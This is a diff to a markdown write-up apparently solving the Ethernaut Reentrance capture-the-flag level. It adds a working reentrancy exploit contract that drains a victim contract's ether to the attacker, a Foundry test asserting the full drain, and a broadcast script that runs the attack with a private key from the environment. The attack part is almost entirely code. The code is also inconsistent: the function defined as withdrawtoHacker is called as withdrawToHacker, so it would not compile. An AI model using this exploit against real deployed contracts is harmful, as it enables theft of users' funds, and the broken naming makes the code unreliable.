@@ -141,11 +141,45 @@ receive() external payable {}
 
 <br>
 
-* we write the following exploit, located at  `src/10/ReentrancyExploit.sol`:
+* we write the following exploit, located at `src/10/ReentrancyExploit.sol`, where the attack occurs at `run()` and `receive()`. the function `withdrawtoHacker()` can be called afterwords to withdraw the balance from the `ReentrancyExploit` contract:
 
 <br>
 
 ```solidity
+contract ReentrancyExploit {
+
+    Reentrance private level;
+    bool private _ENTERED;
+    address private owner;
+    uint256 private initialDeposit;
+
+    constructor(Reentrance _level) {
+        owner = msg.sender;
+        level = _level;
+        _ENTERED = false;
+    }
+
+    function run() public payable {
+        require(msg.value > 0, "must send some ether");
+        initialDeposit = msg.value;
+        level.donate{value: msg.value}(address(this));
+        level.withdraw(initialDeposit);
+        level.withdraw(address(level).balance);
+    }
+
+    function withdrawtoHacker() public returns (bool) {
+        uint256 hackerBalancer = address(this).balance;
+        (bool success, ) = owner.call{value: hackerBalancer}("");
+        return success;
+    }
+
+    receive() external payable {
+        if (!_ENTERED) {
+            _ENTERED = true;
+            level.withdraw(initialDeposit);
+        }
+    }
+}
 
 ```
 
@@ -156,7 +190,55 @@ receive() external payable {}
 <br>
 
 ```solidity
+contract ReentrancyTest is Test {
 
+    Reentrance public level;
+    ReentrancyExploit public exploit;
+    address payable instance = payable(vm.addr(0x10053)); 
+    address hacker = vm.addr(0x1337); 
+    uint256 initialDeposit = 0.01 ether;
+    uint256 initialVictimBalance = 200 ether;
+
+    function setUp() public {
+        vm.prank(instance);  
+        vm.deal(instance, initialVictimBalance);
+        vm.deal(hacker, initialDeposit);
+
+        level = new Reentrance();
+        level.donate{value: initialVictimBalance}(instance);
+    }
+
+    function testReentrancyHack() public {
+
+        vm.startPrank(hacker);
+
+        exploit = new ReentrancyExploit(level);
+        
+        ////////////////////////////
+        // drain the victim contract
+        ////////////////////////////
+
+        assert(hacker.balance == initialDeposit);
+        assert(instance.balance == initialVictimBalance);
+        assert(address(level).balance == initialVictimBalance);
+        assert(address(exploit).balance == 0);
+
+        exploit.run{value: initialDeposit}();
+        assert(address(exploit).balance == initialVictimBalance + initialDeposit);
+
+        ///////////////////////////////////////////
+        // withdraw from ReentrancyExploit contract
+        ///////////////////////////////////////////        
+        assert(hacker.balance == 0);
+        bool success = exploit.withdrawToHacker();
+        
+        assert(success);
+        assert(hacker.balance == initialVictimBalance + initialDeposit);
+        assert(address(exploit).balance == 0);
+
+        vm.stopPrank();
+    }
+}
 ```
 
 <br>
@@ -173,12 +255,31 @@ receive() external payable {}
 
 <br>
 
-* the solution can be submitted with `script/10/Reentrancy.s.sol`:
+* finally, the solution can be submitted with `script/10/Reentrancy.s.sol`:
 
 <br>
 
 ```solidity
+contract Exploit is Script {
 
+        address payable instance = payable(vm.envAddress("INSTANCE_LEVEL10"));  
+        address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));    
+        Reentrance level = Reentrance(instance); 
+        ReentrancyExploit exploit;
+        uint256 initialDeposit = 0.001 ether;
+          
+        function run() external {
+
+            vm.startBroadcast(hacker);
+            
+            exploit = new ReentrancyExploit(level);
+            exploit.run{value: initialDeposit}();
+            bool success = exploit.withdrawToHacker();
+            assert(success);
+
+            vm.stopBroadcast();
+    }
+}
 ```
 
 <br>
@@ -196,13 +297,6 @@ receive() external payable {}
 
 ---
 
-### alternative  solution using `cast`
-
-<br>
-
-<br>
-
-----
 
 ### pwned...
 
